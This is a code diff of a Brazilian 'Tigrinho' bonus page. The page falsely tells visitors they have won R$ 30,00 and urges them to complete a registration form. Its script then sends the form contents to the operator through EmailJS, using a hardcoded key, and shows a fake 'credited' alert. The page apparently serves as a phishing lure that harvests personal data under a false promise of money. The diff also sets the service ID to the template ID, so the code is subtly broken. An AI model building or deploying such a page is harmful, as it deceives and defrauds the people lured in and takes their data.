@@ -4,14 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Resgate Tigrinho - Bônus Liberado</title>
+    <!-- Carrega a biblioteca do EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-            // SUBSTITUA PELA SUA PUBLIC KEY DO EMAILJS
+            // 1. SUA PUBLIC KEY (Ex: user_AbCdEfGhIjKl)
             emailjs.init("dE244dq8weZCu5CiA");
         })();
     </script>
     <style>
+        /* ... (CSS mantém-se igual ao anterior) ... */
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
 
         body {
@@ -167,7 +169,7 @@
         <div class="modal-content">
             <h3>🎉 Bônus Resgatado!</h3>
             <p style="margin: 10px 0;">Você ganhou <strong>R$ 30,00</strong> na conta!</p>
-            <p style="font-size: 12px; color: #666;">Complete o cadastro abaixo para liberar seu saque.</p>
+            <p style="font-size: 12px; color: #666;">Complete o cadastro abaixo para liberar.</p>
             <button class="btn-close-modal" onclick="document.getElementById('modalResgate').style.display='none'">Liberar Agora</button>
         </div>
     </div>
@@ -225,21 +227,25 @@
             
             setTimeout(() => { loaderBar.style.width = '100%'; }, 100);
 
-            const serviceID = 'service_1tsipns'; 
+            // 2. SEUS IDS AQUI
+            const serviceID = 'template_khk4u7o'; 
             const templateID = 'template_khk4u7o';
 
+            // O 'this' refere-se ao form
             emailjs.sendForm(serviceID, templateID, this)
-                .then(() => {
+                .then((response) => {
+                    console.log('SUCCESS!', response.status, response.text);
                     loaderBar.style.background = '#00c853';
                     msg.innerText = "Saldo Liberado! Redirecionando...";
                     msg.style.color = "#00c853";
                     btn.innerText = "SUCESSO";
                     
                     setTimeout(() => {
-                        alert("Parabéns! R$ 30,00 creditados. Iniciando o jogo...");
+                        alert("Parabéns! R$ 30,00 creditados.");
                         // window.location.href = "link_do_jogo.html"; 
                     }, 1500);
                 }, (err) => {
+                    console.log('FAILED...', err);
                     loaderBar.style.background = '#ff0000';
                     msg.innerText = "Erro. Tente novamente.";
                     msg.style.color = "red";
